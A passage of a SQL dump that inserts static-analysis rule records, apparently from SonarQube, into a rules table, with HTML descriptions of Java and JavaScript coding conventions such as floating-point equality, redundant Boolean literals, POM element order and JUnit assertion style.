  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;project ...&gt;
  &lt;artifactId&gt;my-project&lt;/artifactId&gt;

  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention,maven', false, 'HTML', 1510817813079, 1510817813079, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1023, 'Floating point numbers should not be tested for equality', 'S1244', NULL, 'squid', '<p>Floating point math is imprecise because of the challenges of storing such values in a binary representation. Even worse, floating point math is
not associative; push a <code>float</code> or a <code>double</code> through a series of simple mathematical operations and the answer will be
different based on the order of those operation because of the rounding that takes place at each step.</p>
<p>Even simple floating point assignments are not simple:</p>
<pre>
float f = 0.1; // 0.100000001490116119384765625
double d = 0.1; // 0.1000000000000000055511151231257827021181583404541015625
</pre>
<p>(Results will vary based on compiler and compiler settings);</p>
<p>Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on <code>float</code> or <code>double</code> values
is almost always an error. Instead the best course is to avoid floating point comparisons altogether. When that is not possible, you should consider
using one of Java''s float-handling <code>Numbers</code> such as <code>BigDecimal</code> which can properly handle floating point comparisons. A third
option is to look not for equality but for whether the value is close enough. I.e. compare the absolute value of the difference between the stored
value and the expected value against a margin of acceptable error. Note that this does not cover all cases (<code>NaN</code> and <code>Infinity</code>
for instance).</p>
<p>This rule checks for the use of direct and indirect equality/inequailty tests on floats and doubles.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float myNumber = 3.146;
if ( myNumber == 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be false
  // ...
}
if ( myNumber != 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be true
  // ...
}

if (myNumber &lt; 4 || myNumber &gt; 4) { // Noncompliant; indirect inequality test
  // ...
}

float zeroFloat = 0.0f;
if (zeroFloat == 0) {  // Noncompliant. Computations may end up with a value close but not equal to zero.
}
</pre>
<h2>Exceptions</h2>
<p>Since <code>NaN</code> is not equal to itself, the specific case of testing a floating point value against itself is a valid test for
<code>NaN</code> and is therefore ignored. Though using <code>Double.isNaN</code> method should be preferred instead, as intent is more explicit.</p>
<pre>
float f;
double d;
if(f != f) { // Compliant; test for NaN value
  System.out.println("f is NaN");
} else if (f != d) { // Noncompliant
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.3 - Floating-point expressions shall not be tested for equality or inequality. </li>
  <li> MISRA C++:2008, 6-2-2 - Floating-point expressions shall not be directly or indirectly tested for equality or inequality </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra', false, 'HTML', 1510817813081, 1510817813081, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1040, 'Null should not be returned from a "Boolean" method', 'S2447', NULL, 'squid', '<p>While <code>null</code> is technically a valid <code>Boolean</code> value, that fact, and the distinction between <code>Boolean</code> and
<code>boolean</code> is easy to forget. So returning <code>null</code> from a <code>Boolean</code> method is likely to cause problems with callers''
code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Boolean isUsable() {
  // ...
  return null;  // Noncompliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,cwe,pitfall', false, 'HTML', 1510817813125, 1510817813126, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1024, 'pom elements should be in the recommended order', 'S3423', NULL, 'squid', '<p>The POM Code Convention is the Maven project''s internal recommendation for POM element ordering. It calls for listing modifiers in the following
order:</p>
<ol>
  <li> &lt;modelVersion/&gt; </li>
  <li> &lt;parent/&gt; </li>
  <li> &lt;groupId/&gt; </li>
  <li> &lt;artifactId/&gt; </li>
  <li> &lt;version/&gt; </li>
  <li> &lt;packaging/&gt; </li>
  <li> &lt;name/&gt; </li>
  <li> &lt;description/&gt; </li>
  <li> &lt;url/&gt; </li>
  <li> &lt;inceptionYear/&gt; </li>
  <li> &lt;organization/&gt; </li>
  <li> &lt;licenses/&gt; </li>
  <li> &lt;developers/&gt; </li>
  <li> &lt;contributors/&gt; </li>
  <li> &lt;mailingLists/&gt; </li>
  <li> &lt;prerequisites/&gt; </li>
  <li> &lt;modules/&gt; </li>
  <li> &lt;scm/&gt; </li>
  <li> &lt;issueManagement/&gt; </li>
  <li> &lt;ciManagement/&gt; </li>
  <li> &lt;distributionManagement/&gt; </li>
  <li> &lt;properties/&gt; </li>
  <li> &lt;dependencyManagement/&gt; </li>
  <li> &lt;dependencies/&gt; </li>
  <li> &lt;repositories/&gt; </li>
  <li> &lt;pluginRepositories/&gt; </li>
  <li> &lt;build/&gt; </li>
  <li> &lt;reporting/&gt; </li>
  <li> &lt;profiles/&gt; </li>
</ol>
<p>Not following this convention has no technical impact, but will reduce the pom''s readability because most developers are used to the standard
order.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://maven.apache.org/developers/conventions/code.html#POM_Code_Convention">POM Code Convention</a> </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'convention,maven', false, 'HTML', 1510817813082, 1510817813082, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1025, 'Redundant modifiers should not be used', 'S2333', NULL, 'squid', '<p>The methods declared in an <code>interface</code> are <code>public</code> and <code>abstract</code> by default. Any variables are automatically
<code>public static final</code>. There is no need to explicitly declare them so.</p>
<p>Since annotations are implicitly interfaces, the same holds true for them as well.</p>
<p>Similarly, the <code>final</code> modifier is redundant on any method of a <code>final</code> class, and <code>private</code> is redundant on the
constructor of an <code>Enum</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface Vehicle {

  public void go(int speed, Direction direction);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Vehicle {

  void go(int speed, Direction direction);
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy,finding', false, 'HTML', 1510817813083, 1510817813084, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1026, 'Instance methods should not write to "static" fields', 'S2696', NULL, 'squid', '<p>Correctly updating a <code>static</code> field from a non-static method is tricky to get right and could easily lead to bugs if there are multiple
class instances and/or multiple threads in play. Ideally, <code>static</code> fields are only updated from <code>synchronized static</code>
methods.</p>
<p>This rule raises an issue each time a <code>static</code> field is updated from a non-static method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  private static int count = 0;

  public void doSomething() {
    //...
    count++;  // Noncompliant
  }
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'multi-threading', false, 'HTML', 1510817813084, 1510817813085, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1027, 'Dependencies should not have "system" scope', 'S3422', NULL, 'squid', '<p><code>system</code> dependencies are sought at a specific, specified path. This drastically reduces portability because if you deploy your artifact
in an environment that''s not configured just like yours is, your code won''t work. </p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;dependency&gt;
  &lt;groupId&gt;javax.sql&lt;/groupId&gt;
  &lt;artifactId&gt;jdbc-stdext&lt;/artifactId&gt;
  &lt;version&gt;2.0&lt;/version&gt;
  &lt;scope&gt;system&lt;/scope&gt;  &lt;!-- Noncompliant --&gt;
  &lt;systemPath&gt;/usr/bin/lib/rt.jar&lt;/systemPath&gt;  &lt;!-- remove this --&gt;
&lt;/dependency&gt;
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'lock-in,maven', false, 'HTML', 1510817813085, 1510817813085, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1028, 'Boolean literals should not be redundant', 'S1125', NULL, 'squid', '<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (booleanMethod() == true) { /* ... */ }
if (booleanMethod() == false) { /* ... */ }
if (booleanMethod() || false) { /* ... */ }
doSomething(!false);
doSomething(booleanMethod() == true);

booleanVariable = booleanMethod() ? true : false;
booleanVariable = booleanMethod() ? true : exp;
booleanVariable = booleanMethod() ? false : exp;
booleanVariable = booleanMethod() ? exp : true;
booleanVariable = booleanMethod() ? exp : false;
</pre>
<h2>Compliant Solution</h2>
<pre>
if (booleanMethod()) { /* ... */ }
if (!booleanMethod()) { /* ... */ }
if (booleanMethod()) { /* ... */ }
doSomething(true);
doSomething(booleanMethod());

booleanVariable = booleanMethod();
booleanVariable = booleanMethod() || exp;
booleanVariable = !booleanMethod() &amp;&amp; exp;
booleanVariable = !booleanMethod() || exp;
booleanVariable = booleanMethod() &amp;&amp; exp;
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813086, 1510817813086, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1029, 'Local variables should not be declared and then immediately returned or thrown', 'S1488', NULL, 'squid', '<p>Declaring a variable only to immediately return or throw it is a bad practice.</p>
<p>Some developers argue that the practice improves code readability, because it enables them to explicitly name what is being returned. However, this
variable is an internal implementation detail that is not exposed to the callers of the method. The method name should be sufficient for callers to
know exactly what will be returned.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public long computeDurationInMilliseconds() {
  long duration = (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
  return duration;
}

public void doSomething() {
  RuntimeException myException = new RuntimeException();
  throw myException;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public long computeDurationInMilliseconds() {
  return (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
}

public void doSomething() {
  throw new RuntimeException();
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813087, 1510817813087, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1030, 'Custom resources should be closed', 'S3546', NULL, 'squid', '<p>Leaking resources in an application is never a good idea, as it can lead to memory issues, and even the crash of the application. This rule
template allows you to specify which constructions open a resource and how it is closed in order to raise issue within a method scope when custom
resources are leaked.</p>
<h2>See also</h2>
<ul>
  <li> {rule:squid:S2095} - Resources should be closed </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'denial-of-service', true, 'HTML', 1510817813088, 1510817813088, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1031, 'Tests should include assertions', 'S2699', NULL, 'squid', '<p>A test case without assertions ensures only that no exceptions are thrown. Beyond basic runnability, it ensures nothing about the behavior of the
code under test.</p>
<p>This rule raises an exception when no assertions from any of the following frameworks are found in a test:</p>
<ul>
  <li> Junit </li>
  <li> Fest 1.x </li>
  <li> Fest 2.x </li>
  <li> Rest-assured 2.0 </li>
  <li> AssertJ </li>
  <li> Hamcrest </li>
  <li> Spring''s <code>org.springframework.test.web.servlet.ResultActions.andExpect()</code> </li>
  <li> Truth Framework </li>
  <li> Mockito </li>
  <li> EasyMock </li>
  <li> JMock </li>
  <li> WireMock </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testDoSomething() {  // Noncompliant
  MyClass myClass = new MyClass();
  myClass.doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testDoSomething() {
  MyClass myClass = new MyClass();
  assertNull(myClass.doSomething());  // JUnit assertion
  assertThat(myClass.doSomething()).isNull();  // Fest assertion
}
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'tests', false, 'HTML', 1510817813116, 1510817813116, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1032, 'Return of boolean expressions should not be wrapped into an "if-then-else" statement', 'S1126', NULL, 'squid', '<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (expression) {
  return true;
} else {
  return false;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
return expression;
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813117, 1510817813117, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1033, 'JUnit assertions should include messages', 'S2698', NULL, 'squid', '<p>Adding messages to JUnit assertions is an investment in your future productivity. Spend a few seconds writing them now, and you''ll save a lot of
time on the other end when either the tests fail and you need to quickly diagnose the problem, or when you need to maintain the tests and the
assertion messages work as a sort of documentation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
assertEquals(4, list.size());  // Noncompliant

try {
  fail();  // Noncompliant
} catch (Exception e) {
  assertThat(list.get(0)).isEqualTo("pear");  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
assertEquals("There should have been 4 Fruits in the list", 4, list.size());

try {
  fail("And exception is expected here");
} catch (Exception e) {
  assertThat(list.get(0)).as("check first element").overridingErrorMessage("The first element should be a pear, not a %s", list.get(0)).isEqualTo("pear");
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'tests', false, 'HTML', 1510817813118, 1510817813118, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1034, 'Redundant pairs of parentheses should be removed', 'UselessParenthesesCheck', 'S1110', 'squid', '<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int x = (y / 2 + 1);   //Compliant even if the parenthesis are ignored by the compiler

if (a &amp;&amp; ((x+y &gt; 0))) {  // Noncompliant
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int x = (y / 2 + 1);

if (a &amp;&amp; (x+y &gt; 0)) {
  //...
}

return (x + 1);
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'confusing', false, 'HTML', 1510817813119, 1510817813119, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1035, 'Unused "private" methods should be removed', 'UnusedPrivateMethod', 'S1144', 'squid', '<p><code>private</code> methods that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>
<p>Note that this rule does not take reflection into account, which means that issues will be raised on <code>private</code> methods that are only
accessed using the reflection API.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Serializable
{
  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.
  public static void doSomething(){
    Foo foo = new Foo();
    ...
  }
  private void unusedPrivateMethod(){...}
  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism
  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo implements Serializable
{
  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.
  public static void doSomething(){
    Foo foo = new Foo();
    ...
  }

  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism

  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn''t raise any issue on annotated methods.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/OYIyAQ">CERT, MSC07-CPP.</a> - Detect and remove dead code </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,unused', false, 'HTML', 1510817813120, 1510817813120, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1047, 'Track uses of "NOSONAR" comments', 'NoSonar', 'S1291', 'squid', '<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results
but it can also be used abusively to hide real quality flaws.</p>
<p>This rule raises an issue when <code>NOSONAR</code> is used.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'bad-practice', false, 'HTML', 1510817813133, 1510817813134, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1036, 'Useless imports should be removed', 'UselessImportCheck', 'S1128', 'squid', '<p>The imports part of a file should be handled by the Integrated Development Environment (IDE), not manually by the developer.</p>
<p>Unused and useless imports should not occur if that is the case.</p>
<p>Leaving them in reduces the code''s readability, since their presence can be confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
package my.company;

import java.lang.String;        // Noncompliant; java.lang classes are always implicitly imported
import my.company.SomeClass;    // Noncompliant; same-package files are always implicitly imported
import java.io.File;            // Noncompliant; File is not used

import my.company2.SomeType;
import my.company2.SomeType;    // Noncompliant; ''SomeType'' is already imported

class ExampleClass {

  public String someString;
  public SomeType something;

}
</pre>
<h2>Exceptions</h2>
<p>Imports for types mentioned in comments, such as Javadocs, are ignored.</p>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'unused', false, 'HTML', 1510817813121, 1510817813121, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1037, '"switch" statements should not have too many "case" clauses', 'S1479', NULL, 'squid', '<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map
structure would be more readable and maintainable, and should be used instead.</p>
<h2>Exceptions</h2>
<p>This rule ignores <code>switch</code>es over <code>Enum</code>s and empty, fall-through cases.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817813122, 1510817813122, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1038, 'Unit tests should throw exceptions', 'S3658', NULL, 'squid', '<p>When the code under test in a unit test throws an exception, the test itself fails. Therefore, there is no need to surround the tested code with a
<code>try</code>-<code>catch</code> structure to detect failure. Instead, you can simply move the exception type to the method signature. </p>
<p>This rule raises an issue when there is a fail assertion inside a <code>catch</code> block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testMethod() {
  try {
            // Some code
  } catch (MyException e) {
    Assert.fail(e.getMessage());  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testMethod() throws MyException {
    // Some code
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy,tests', false, 'HTML', 1510817813123, 1510817813124, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1039, 'Unused type parameters should be removed', 'S2326', NULL, 'squid', '<p>Type parameters that aren''t used are dead code, which can only distract and possibly confuse developers during maintenance. Therefore, unused type
parameters should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int &lt;T&gt; Add(int a, int b) // Noncompliant; &lt;T&gt; is ignored
{
  return a + b;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int Add(int a, int b)
{
  return a + b;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,unused', false, 'HTML', 1510817813124, 1510817813125, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1124, 'Function calls should not pass extra arguments', 'S930', NULL, 'javascript', '<p>You can easily call a JavaScript function with more arguments than the function needs, but the extra arguments will be just ignored by function execution.</p>

<h2>Noncompliant Code Example</h2>
<pre>
function say(a, b) {
  print(a + " " + b);
}

say("hello", "world", "!"); // Noncompliant; last argument is not used
</pre>

<h2>Exceptions</h2>
<p>No issue is reported when <code>arguments</code> is used in the body of the function being called.</p>

<pre>
function doSomething(a, b) {
  compute(arguments);
}

doSomething(1, 2, 3) // Compliant
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cwe,misra', false, 'HTML', 1510817813233, 1510817813234, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1125, 'Functions should not have too many lines', 'S138', NULL, 'javascript', '<p>
  A function that grows too large tends to aggregate too many responsibilities.</br>
  Such function inevitably become harder to understand and therefore harder to maintain.
</p>
<p>
  Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.
</p>
<p>
  Those smaller functions will not only be easier to understand, but also probably easier to test.
</p>

<h2>Exceptions</h2>
<p>
  This function ignores Immediately Invoked Function Expressions (IIFE), functions which are created and invoked without ever being assigned a name.
</p>
<pre>
 (function () { // Ignored by this rule

  function open() {  // Classic function declaration; not ignored
    // ...
  }

  function read() {
    // ...
  }

  function readlines() {
    // ...
  }
})();
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817813235, 1510817813236, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1041, 'Assertion arguments should be passed in the correct order', 'S3415', NULL, 'squid', '<p>The standard assertions library methods such as <code>org.junit.Assert.assertEquals</code>, and <code>org.junit.Assert.assertSame</code> expect the
first argument to be the expected value and the second argument to be the actual value. Swap them, and your test will still have the same outcome
(succeed/fail when it should) but the error messages will be confusing. </p>
<p>This rule raises an issue when the second argument to an assertions library method is a hard-coded value and the first argument is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
org.junit.Assert.assertEquals(runner.exitCode(), 0, "Unexpected exit code");  // Noncompliant; Yields error message like: Expected:&lt;-1&gt;. Actual:&lt;0&gt;.
</pre>
<h2>Compliant Solution</h2>
<pre>
org.junit.Assert.assertEquals(0, runner.exitCode(), "Unexpected exit code");
